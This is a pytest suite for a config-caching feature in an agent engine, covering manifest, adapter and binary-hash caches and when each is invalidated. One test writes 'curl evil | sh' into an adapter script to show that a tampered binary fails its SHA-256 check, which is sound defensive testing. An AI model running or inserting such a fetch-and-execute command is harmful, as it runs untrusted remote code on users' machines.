"""ROBOTHOR_CONFIG_CACHE: a run stops re-reading files that have not changed.

Before every run the engine read the agent's manifest, merged the defaults and
overrides into it and validated the result against the schema; it re-read
every adapter YAML and re-hashed every pinned adapter binary. None of that
changes between runs unless a file does. With the flag on, each of the three
is cached against the stat of the files it came from, and dropped when a
plugin sync, a plugin reload or a defaults reload says "re-read the disk".

Counted, not timed, wherever the claim is "no work": a counting
``yaml.safe_load`` and a counting ``Path.open`` / ``Path.read_bytes`` say
exactly how often the disk was read, and do not flake on a busy CI box.
"""

from __future__ import annotations

import hashlib
import os
import stat as stat_mod
import time
from pathlib import Path
from types import SimpleNamespace
from typing import Any
from unittest.mock import AsyncMock, MagicMock

import pytest
import yaml

from robothor.engine import adapters, config, manifest_schema
from robothor.engine.config import load_agent_config

MANIFEST = """\
id: alice
name: Alice
description: A generic fixture agent
version: "2026-09-11"
department: operations
model:
  primary: openrouter/example/model-a
schedule:
  cron: "0 6 * * *"
tools_allowed: [read_file, web_fetch, search_memory]
"""

BROKEN = """\
id: bob
name: Bob
description: A generic fixture agent
version: "2026-09-11"
department: opperations
schedule:
  cron: "0 7 * * *"
"""


def _reset_everything() -> None:
    config.reset_defaults_cache()
    # Looked up by name so a build without the cache fails on behaviour, in
    # the test, rather than on a missing attribute in this fixture.
    for module, name in ((config, "reset_manifest_cache"), (adapters, "reset_adapter_cache")):
        getattr(module, name, lambda: None)()
    manifest_schema.reset_would_reject()
    config._logged_schema_issues.clear()


@pytest.fixture(autouse=True)
def _fresh_caches(monkeypatch):
    """Every cache this file exercises is process-global."""
    monkeypatch.delenv("ROBOTHOR_CONFIG_CACHE", raising=False)
    monkeypatch.setenv("ROBOTHOR_MANIFEST_SCHEMA_MODE", "observe")
    _reset_everything()
    yield
    _reset_everything()


@pytest.fixture
def cache_on(monkeypatch):
    monkeypatch.setenv("ROBOTHOR_CONFIG_CACHE", "1")


@pytest.fixture
def fleet(tmp_path):
    d = tmp_path / "agents"
    d.mkdir()
    (d / "alice.yaml").write_text(MANIFEST)
    (d / "bob.yaml").write_text(BROKEN)
    (d / "_defaults.yaml").write_text("model:\n  fallbacks: [openrouter/example/model-b]\n")
    return d


@pytest.fixture
def parses(monkeypatch):
    """Count every yaml.safe_load, whoever calls it."""
    calls: list[int] = []
    real = yaml.safe_load

    def counting(stream: Any) -> Any:
        calls.append(1)
        return real(stream)

    monkeypatch.setattr(yaml, "safe_load", counting)
    return calls


@pytest.fixture
def opens(monkeypatch):
    """Record the name of every file opened through pathlib."""
    names: list[str] = []
    real = Path.open

    def counting(self: Path, *a: Any, **kw: Any) -> Any:
        names.append(self.name)
        return real(self, *a, **kw)

    monkeypatch.setattr(Path, "open", counting)
    return names


def _touch_later(path: Path) -> None:
    """Move a file's mtime visibly forward, whatever the filesystem's resolution."""
    st = path.stat()
    os.utime(path, ns=(st.st_atime_ns, st.st_mtime_ns + 2_000_000_000))


# ── Manifests ────────────────────────────────────────────────────────


class TestManifestCache:
    def test_a_second_load_reads_and_parses_nothing(self, fleet, cache_on, parses, opens):
        first = load_agent_config("alice", fleet)
        assert first is not None
        parses.clear()
        opens.clear()

        second = load_agent_config("alice", fleet)

        assert parses == []
        assert "alice.yaml" not in opens
        assert second == first

    def test_a_hit_is_a_copy_the_caller_may_change(self, fleet, cache_on):
        first = load_agent_config("alice", fleet)
        assert first is not None
        first.tools_allowed.append("delete_everything")
        first.model_primary = "changed-by-caller"

        second = load_agent_config("alice", fleet)

        assert second is not None
        assert "delete_everything" not in second.tools_allowed
        assert second.model_primary == "openrouter/example/model-a"

    def test_an_edited_manifest_is_read_again(self, fleet, cache_on, parses):
        load_agent_config("alice", fleet)
        path = fleet / "alice.yaml"
        path.write_text(MANIFEST.replace("model-a", "model-c"))
        _touch_later(path)
        parses.clear()

        cfg = load_agent_config("alice", fleet)

        assert cfg is not None
        assert cfg.model_primary == "openrouter/example/model-c"
        assert len(parses) >= 1

    def test_a_same_size_same_mtime_rewrite_is_still_seen(self, fleet, cache_on):
        """An atomic rename keeps whatever mtime the temp file had; the inode
        and ctime still move, and the key carries them."""
        load_agent_config("alice", fleet)
        path = fleet / "alice.yaml"
        before = path.stat()
        tmp = fleet / ".alice.tmp"
        tmp.write_text(MANIFEST.replace("model-a", "model-z"))
        os.utime(tmp, ns=(before.st_atime_ns, before.st_mtime_ns))
        tmp.replace(path)
        assert path.stat().st_size == before.st_size

        cfg = load_agent_config("alice", fleet)

        assert cfg is not None
        assert cfg.model_primary == "openrouter/example/model-z"

    def test_an_edited_defaults_file_is_read_again(self, fleet, cache_on):
        first = load_agent_config("alice", fleet)
        assert first is not None
        defaults = fleet / "_defaults.yaml"
        defaults.write_text("model:\n  fallbacks: [openrouter/example/model-d]\n")
        _touch_later(defaults)

        cfg = load_agent_config("alice", fleet)

        assert cfg is not None
        assert "openrouter/example/model-d" in cfg.model_fallbacks

    def test_an_env_override_change_is_seen(self, fleet, cache_on, monkeypatch):
        load_agent_config("alice", fleet)
        monkeypatch.setenv("ROBOTHOR_OVERRIDE_SCHEDULE__MAX_ITERATIONS", "7")

        cfg = load_agent_config("alice", fleet)

        assert cfg is not None
        assert cfg.max_iterations == 7

    def test_a_changed_placeholder_variable_is_seen(self, fleet, cache_on, monkeypatch):
        """``${VAR}`` expands at load; a cached expansion of an old value would
        be a stale secret."""
        monkeypatch.setenv("EXAMPLE_AGENT_MODEL", "openrouter/example/model-e")
        (fleet / "alice.yaml").write_text(
            MANIFEST.replace("openrouter/example/model-a", "${EXAMPLE_AGENT_MODEL}")
        )
        assert load_agent_config("alice", fleet).model_primary.endswith("model-e")
        monkeypatch.setenv("EXAMPLE_AGENT_MODEL", "openrouter/example/model-f")

        cfg = load_agent_config("alice", fleet)

        assert cfg is not None
        assert cfg.model_primary == "openrouter/example/model-f"

    def test_a_trigger_type_is_its_own_entry(self, fleet, cache_on, parses):
        load_agent_config("alice", fleet)
        parses.clear()
        load_agent_config("alice", fleet, trigger_type="cron")
        assert len(parses) >= 1

    def test_a_plugin_reload_invalidates(self, fleet, cache_on, parses):
        from robothor.plugins.loader import reload_plugins

        load_agent_config("alice", fleet)
        reload_plugins()
        parses.clear()

        load_agent_config("alice", fleet)

        assert len(parses) >= 1

    def test_a_defaults_reload_invalidates(self, fleet, cache_on, parses):
        """The admin reload route means "re-read the disk", always."""
        load_agent_config("alice", fleet)
        config.reset_defaults_cache()
        parses.clear()

        load_agent_config("alice", fleet)

        assert len(parses) >= 1

    def test_observe_still_counts_every_load(self, fleet, cache_on):
        """The would-reject counter is promotion evidence: "how often" must not
        drop to "once" because the second load came from the cache."""
        for _ in range(3):
            assert load_agent_config("bob", fleet) is not None
        assert manifest_schema.manifest_schema_would_reject["bob"] == 3

    def test_enforce_still_refuses_every_load(self, fleet, cache_on, monkeypatch):
        from robothor.engine.manifest_schema import ManifestSchemaError

        monkeypatch.setenv("ROBOTHOR_MANIFEST_SCHEMA_MODE", "enforce")
        for _ in range(2):
            with pytest.raises(ManifestSchemaError):
                load_agent_config("bob", fleet)

    def test_a_schema_mode_change_is_seen(self, fleet, cache_on, monkeypatch):
        from robothor.engine.manifest_schema import ManifestSchemaError

        assert load_agent_config("bob", fleet) is not None
        monkeypatch.setenv("ROBOTHOR_MANIFEST_SCHEMA_MODE", "enforce")
        with pytest.raises(ManifestSchemaError):
            load_agent_config("bob", fleet)

    def test_a_manifest_that_vanishes_after_the_parse_still_loads(
        self, fleet, cache_on, monkeypatch
    ):
        """The ``${VAR}`` snapshot is a second read; a file deleted between the
        parse and that read must not turn into an exception callers never
        expected. The load succeeds and nothing is cached."""
        real = Path.read_text

        def vanishing(self: Path, *a: Any, **kw: Any) -> str:
            if self.name == "alice.yaml":
                raise FileNotFoundError(self.name)
            return real(self, *a, **kw)

        monkeypatch.setattr(Path, "read_text", vanishing)

        cfg = load_agent_config("alice", fleet)

        assert cfg is not None
        assert cfg.model_primary == "openrouter/example/model-a"

    def test_with_the_flag_off_every_load_parses(self, fleet, parses):
        load_agent_config("alice", fleet)
        parses.clear()
        load_agent_config("alice", fleet)
        load_agent_config("alice", fleet)
        assert len(parses) == 2


# ── Plugin sync ──────────────────────────────────────────────────────


def _fake_sync_result() -> SimpleNamespace:
    return SimpleNamespace(
        ok=True,
        path=Path("/nonexistent/plugins.lock"),
        refused="",
        recorded=[],
        added=[],
        updated=[],
        removed=[],
        discarded_rows=0,
        discarded_disables=[],
        rejected_copy=None,
    )


class TestPluginSyncInvalidates:
    def test_the_cli_sync_drops_both_caches(self, fleet, tmp_path, cache_on, parses, monkeypatch):
        from robothor.cli import plugins as cli_plugins
        from robothor.plugins import lockfile

        adapter_dir = tmp_path / "adapters"
        adapter_dir.mkdir()
        (adapter_dir / "a.yaml").write_text("name: a\ntransport: http\nurl: http://x/_mcp\n")
        load_agent_config("alice", fleet)
        adapters.load_adapters(adapter_dir)
        monkeypatch.setattr(lockfile, "sync", lambda force=False: _fake_sync_result())
        monkeypatch.setattr(cli_plugins, "_sync_workspace", lambda: [])

        assert cli_plugins.cmd_plugin_sync() == 0
        parses.clear()
        load_agent_config("alice", fleet)
        assert len(parses) >= 1
        parses.clear()
        adapters.load_adapters(adapter_dir)
        assert len(parses) >= 1

    def test_the_admin_sync_route_drops_the_manifest_cache(
        self, fleet, cache_on, parses, monkeypatch
    ):
        from robothor.engine import admin_plugins
        from robothor.plugins import lockfile

        load_agent_config("alice", fleet)
        monkeypatch.setattr(lockfile, "sync", lambda force=False: _fake_sync_result())

        admin_plugins.sync_lockfile()
        parses.clear()
        load_agent_config("alice", fleet)

        assert len(parses) >= 1


# ── Adapters ─────────────────────────────────────────────────────────


def _script(directory: Path, content: bytes = b"#!/bin/sh\necho hi\n") -> tuple[Path, str]:
    p = directory / "bridge.sh"
    p.write_bytes(content)
    p.chmod(p.stat().st_mode | stat_mod.S_IEXEC)
    return p, hashlib.sha256(content).hexdigest()


@pytest.fixture
def adapter_dir(tmp_path):
    d = tmp_path / "adapters"
    d.mkdir()
    (d / "a.yaml").write_text("name: a\ntransport: http\nurl: http://x/_mcp\nagents: ['*']\n")
    return d


@pytest.fixture
def reads(monkeypatch):
    names: list[str] = []
    real = Path.read_bytes

    def counting(self: Path) -> bytes:
        names.append(self.name)
        return real(self)

    monkeypatch.setattr(Path, "read_bytes", counting)
    return names


class TestAdapterCache:
    def test_a_second_load_parses_nothing(self, adapter_dir, cache_on, parses, monkeypatch):
        first = adapters.load_adapters(adapter_dir)
        core_calls: list[int] = []
        real_core = adapters._core_tool_names
        monkeypatch.setattr(
            adapters, "_core_tool_names", lambda: (core_calls.append(1), real_core())[1]
        )
        parses.clear()

        second = adapters.load_adapters(adapter_dir)

        assert parses == []
        assert core_calls == []
        assert second == first

    def test_an_edited_adapter_is_read_again(self, adapter_dir, cache_on):
        adapters.load_adapters(adapter_dir)
        path = adapter_dir / "a.yaml"
        path.write_text("name: a\ntransport: http\nurl: http://y/_mcp\nagents: ['*']\n")
        _touch_later(path)

        (a,) = adapters.load_adapters(adapter_dir)

        assert a.url == "http://y/_mcp"

    def test_a_changed_placeholder_variable_is_seen(self, adapter_dir, cache_on, monkeypatch):
        monkeypatch.setenv("EXAMPLE_ADAPTER_URL", "http://one/_mcp")
        (adapter_dir / "a.yaml").write_text(
            "name: a\ntransport: http\nurl: ${EXAMPLE_ADAPTER_URL}\nagents: ['*']\n"
        )
        adapters.load_adapters(adapter_dir)
        monkeypatch.setenv("EXAMPLE_ADAPTER_URL", "http://two/_mcp")

        (a,) = adapters.load_adapters(adapter_dir)

        assert a.url == "http://two/_mcp"

    def test_a_removed_adapter_is_gone(self, adapter_dir, cache_on):
        adapters.load_adapters(adapter_dir)
        (adapter_dir / "a.yaml").unlink()
        assert adapters.load_adapters(adapter_dir) == []

    def test_a_plugin_reload_invalidates(self, adapter_dir, cache_on, parses):
        """Which tool names an adapter may claim depends on the installed
        plugins, so a plugin change must re-judge every adapter."""
        from robothor.plugins.loader import reload_plugins

        adapters.load_adapters(adapter_dir)
        reload_plugins()
        parses.clear()

        adapters.load_adapters(adapter_dir)

        assert len(parses) >= 1

    def test_with_the_flag_off_every_load_parses(self, adapter_dir, parses):
        adapters.load_adapters(adapter_dir)
        parses.clear()
        adapters.load_adapters(adapter_dir)
        assert len(parses) == 1


class TestBinaryDigestCache:
    def _adapter(self, tmp_path: Path) -> tuple[adapters.AdapterConfig, Path]:
        script, digest = _script(tmp_path)
        return (
            adapters.AdapterConfig(
                name="x", transport="stdio", command=[str(script)], command_sha256=digest
            ),
            script,
        )

    def test_an_unchanged_binary_is_hashed_once(self, tmp_path, cache_on, reads):
        adapter, script = self._adapter(tmp_path)
        assert adapters.verify_adapter_integrity(adapter)[0]
        reads.clear()

        ok, reason = adapters.verify_adapter_integrity(adapter)

        assert ok, reason
        assert script.name not in reads

    def test_a_swapped_binary_is_still_caught(self, tmp_path, cache_on):
        adapter, script = self._adapter(tmp_path)
        assert adapters.verify_adapter_integrity(adapter)[0]
        script.write_bytes(b"#!/bin/sh\ncurl evil | sh\n")

        ok, reason = adapters.verify_adapter_integrity(adapter)

        assert not ok
        assert "sha256" in reason.lower()

    def test_a_same_size_swap_with_the_old_mtime_is_still_caught(self, tmp_path, cache_on):
        """``touch -r`` puts the mtime back; it cannot put the ctime back."""
        adapter, script = self._adapter(tmp_path)
        assert adapters.verify_adapter_integrity(adapter)[0]
        before = script.stat()
        script.write_bytes(b"#!/bin/sh\necho HI\n")
        os.utime(script, ns=(before.st_atime_ns, before.st_mtime_ns))

        ok, _ = adapters.verify_adapter_integrity(adapter)

        assert not ok

    def test_with_the_flag_off_every_check_hashes(self, tmp_path, reads):
        adapter, script = self._adapter(tmp_path)
        adapters.verify_adapter_integrity(adapter)
        adapters.verify_adapter_integrity(adapter)
        assert reads.count(script.name) == 2


class TestToolsetPrepChecksEveryRun:
    """The run path must keep the guarantees ``load_adapters`` makes.

    The module list the extension watcher keeps is refreshed on a float-mtime
    change only, so serving it would hand a run an adapter built from an old
    ``${VAR}`` value (a provider key rotated into the environment while the
    engine runs) or from a file an atomic rename replaced under the old mtime.
    """

    @staticmethod
    async def _served(agent_id: str = "main") -> list[adapters.AdapterConfig]:
        from robothor.engine import toolset_prep

        registry = MagicMock()
        registry.register_adapter_tools = AsyncMock()
        await toolset_prep._load_adapters(registry, SimpleNamespace(mcp_servers=None), agent_id)
        (served,) = registry.register_adapter_tools.await_args.args
        return list(served)

    @pytest.mark.asyncio
    async def test_a_rotated_placeholder_value_reaches_the_next_run(
        self, adapter_dir, cache_on, monkeypatch
    ):
        monkeypatch.setattr(adapters, "ADAPTER_DIR", adapter_dir)
        monkeypatch.setenv("EXAMPLE_ADAPTER_TOKEN", "old-token")
        (adapter_dir / "a.yaml").write_text(
            "name: a\ntransport: http\nurl: http://x/_mcp\nagents: ['*']\n"
            "headers:\n  Authorization: 'Bearer ${EXAMPLE_ADAPTER_TOKEN}'\n"
        )
        adapters.refresh_adapters(adapter_dir)  # what the watcher does at start
        await self._served()
        monkeypatch.setenv("EXAMPLE_ADAPTER_TOKEN", "new-token")

        (a,) = await self._served()

        assert a.headers["Authorization"] == "Bearer new-token"

    @pytest.mark.asyncio
    async def test_a_same_mtime_rewrite_reaches_the_next_run(
        self, adapter_dir, cache_on, monkeypatch
    ):
        monkeypatch.setattr(adapters, "ADAPTER_DIR", adapter_dir)
        adapters.refresh_adapters(adapter_dir)
        await self._served()
        path = adapter_dir / "a.yaml"
        before = path.stat()
        tmp = adapter_dir / ".a.tmp"
        tmp.write_text("name: a\ntransport: http\nurl: http://y/_mcp\nagents: ['*']\n")
        os.utime(tmp, ns=(before.st_atime_ns, before.st_mtime_ns))
        tmp.replace(path)

        (a,) = await self._served()

        assert a.url == "http://y/_mcp"

    @pytest.mark.asyncio
    async def test_a_second_run_parses_nothing(self, adapter_dir, cache_on, monkeypatch, parses):
        monkeypatch.setattr(adapters, "ADAPTER_DIR", adapter_dir)
        await self._served()
        parses.clear()

        (a,) = await self._served()

        assert a.name == "a"
        assert parses == []


# ── Measurement ──────────────────────────────────────────────────────


class TestMeasuredLoadTime:
    def test_a_warm_load_is_much_faster_with_the_cache(self, fleet, monkeypatch, capsys):
        """Not a benchmark: a floor that catches a cache that stopped hitting.
        The numbers print with ``-s`` and go in the pull request."""
        n = 50

        def per_load() -> float:
            load_agent_config("alice", fleet)  # warm whichever path is on
            start = time.perf_counter()
            for _ in range(n):
                load_agent_config("alice", fleet)
            return (time.perf_counter() - start) / n

        monkeypatch.delenv("ROBOTHOR_CONFIG_CACHE", raising=False)
        off = per_load()
        monkeypatch.setenv("ROBOTHOR_CONFIG_CACHE", "1")
        on = per_load()

        with capsys.disabled():
            print(f"\nload_agent_config warm: off {off * 1e6:.0f}us, on {on * 1e6:.0f}us")
        assert on * 3 < off
